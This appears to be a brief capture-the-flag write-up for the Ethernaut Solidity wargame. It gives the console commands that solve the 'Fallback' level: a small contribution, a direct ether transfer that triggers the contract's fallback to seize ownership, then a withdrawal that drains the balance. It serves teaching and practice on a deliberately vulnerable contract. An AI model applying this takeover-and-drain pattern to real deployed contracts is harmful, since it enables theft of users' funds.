# Ethernaut
The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

## 1.Fallback
~~~
> contract.contribute({value:toWei("0.0001", "ether")})

> web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
	
> contract.owner()
< [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"

> contract.withdraw()

> getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
< [[PromiseResult]]: "0"
~~~
